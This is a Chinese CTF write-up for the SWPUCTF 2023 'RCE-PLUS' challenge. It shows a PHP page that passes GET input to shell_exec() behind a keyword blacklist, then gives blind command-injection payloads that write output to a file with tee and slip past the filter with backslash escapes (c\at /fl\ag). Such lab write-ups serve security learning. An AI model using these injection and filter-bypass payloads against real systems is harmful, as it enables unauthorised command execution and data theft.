# 【SWPUCTF 2023 秋季新生赛】RCE-PLUS


# [SWPUCTF 2023 秋季新生赛]RCE-PLUS

## 思路
* 源码

  ```
  &lt;?php
  error_reporting(0);
  highlight_file(__FILE__);
  function strCheck($cmd)
  {
      if(!preg_match(&#34;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&#34;, $cmd)){
          return($cmd);
      }
      else{
          die(&#34;i hate this&#34;);      
        }
  }
  $cmd=$_GET[&#39;cmd&#39;];
  strCheck($cmd);
  shell_exec($cmd);
  ?&gt; 
  ```
  
  过滤了很多东西，但是空格什么的没过滤
  
  发现是用`shell_exec()`无回显的命令执行，所以把文件写入txt看结果
  
* 判断指令

  ```
  ?cmd=ls / | sleep 5
  ```
  
* 把回显输入文本文件

  &gt; 两种方法
  
  ```
  ?cmd=ls / | tee 1.txt
  ?cmd=ls / &gt; tee 1.txt
  ```
  
  直接访问
  
* 绕过对cat和flag的过滤

  反斜杠绕过

  ```
  ?cmd=c\at /fl\ag | tee 2.txt
  ?cmd=c\at /fl\ag &gt; tee 2.txt
  ```


## Payload

```
?cmd=ls / | tee 1.txt
?cmd=c\at /fl\ag | tee 2.txt
```

## 总结

* 无回显RCE
* WAF绕过

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-swpuctf-2023-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9Brce-plus/  

